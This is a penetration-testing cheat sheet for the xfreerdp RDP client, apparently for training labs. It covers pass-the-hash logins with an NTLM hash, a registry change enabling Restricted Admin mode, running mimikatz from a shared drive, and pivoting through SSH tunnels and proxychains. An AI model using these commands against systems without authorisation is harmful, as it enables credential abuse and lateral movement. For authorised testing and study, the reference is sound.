# xfreerdp

**Tags:** `#xfreerdp` `#rdp` `#remoteaccess` `#windows` `#pivoting`

Linux RDP client from the FreeRDP project. Connect to Windows RDP sessions from Kali — supports pass-the-hash, drive/clipboard sharing, and NLA. Standard tool for accessing Windows targets and pivoting via RDP.

**Source:** https://github.com/FreeRDP/FreeRDP
**Install:** Pre-installed on Kali (`sudo apt install freerdp2-x11`)

```bash
xfreerdp /v:10.129.204.23 /u:administrator /p:Password123
```

> [!note]
> Use `/d:` for domain accounts. Pass-the-hash works with `/pth:`. Add `/dynamic-resolution` for a resizable window. Use `/drive:` to share a local folder for easy file transfer.

---

## Basic Connections

```bash
# Local account
xfreerdp /v:10.129.204.23 /u:administrator /p:Password123

# Domain account
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2

# Custom port
xfreerdp /v:10.129.204.23:3390 /u:administrator /p:Password123

# Prompt for password
xfreerdp /v:10.129.204.23 /u:administrator
```

---

## Pass-the-Hash (PTH)

```bash
# Requires "Restricted Admin" mode enabled on target
xfreerdp /v:10.129.204.23 /u:administrator /d:inlanefreight.htb \
  /pth:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

# Enable Restricted Admin if you have admin access already
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

## Display Options

```bash
# Dynamic resolution (resizable window)
xfreerdp /v:10.129.204.23 /u:admin /p:pass /dynamic-resolution

# Set resolution
xfreerdp /v:10.129.204.23 /u:admin /p:pass /w:1920 /h:1080

# Fullscreen
xfreerdp /v:10.129.204.23 /u:admin /p:pass /f

# Multimon
xfreerdp /v:10.129.204.23 /u:admin /p:pass /multimon
```

---

## File Transfer via Shared Drive

```bash
# Share Kali folder to target — appears as a network drive in Windows
xfreerdp /v:10.129.204.23 /u:admin /p:pass /drive:kali,/home/kali/tools

# Access from Windows: \\tsclient\kali\
# Copy files from Windows → \\tsclient\kali\
# Run tools directly: \\tsclient\kali\mimikatz.exe
```

---

## Clipboard & Other Options

```bash
# Enable clipboard sharing
xfreerdp /v:10.129.204.23 /u:admin /p:pass /clipboard

# Disable cert warning (self-signed certs)
xfreerdp /v:10.129.204.23 /u:admin /p:pass /cert:ignore

# No NLA (when NLA is disabled on target)
xfreerdp /v:10.129.204.23 /u:admin /p:pass -nego

# Verbose for debugging
xfreerdp /v:10.129.204.23 /u:admin /p:pass /log-level:DEBUG
```

---

## Pivoting via RDP

```bash
# Via SSH tunnel — forward remote RDP through SSH
ssh -L 13389:172.16.5.10:3389 user@10.129.14.128 -N

# Connect via tunnel
xfreerdp /v:127.0.0.1:13389 /u:administrator /p:Password123

# Via proxychains
proxychains xfreerdp /v:172.16.5.10 /u:administrator /p:Password123
```

---

## Key Flags

| Flag | Description |
|------|-------------|
| `/v:<host>` | Target host/IP (optional `:port`) |
| `/u:<user>` | Username |
| `/p:<pass>` | Password |
| `/d:<domain>` | Domain |
| `/pth:<hash>` | Pass-the-hash (NTLM) |
| `/dynamic-resolution` | Resizable window |
| `/f` | Fullscreen |
| `/drive:<name>,<path>` | Share local folder |
| `/clipboard` | Enable clipboard |
| `/cert:ignore` | Skip cert validation |

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
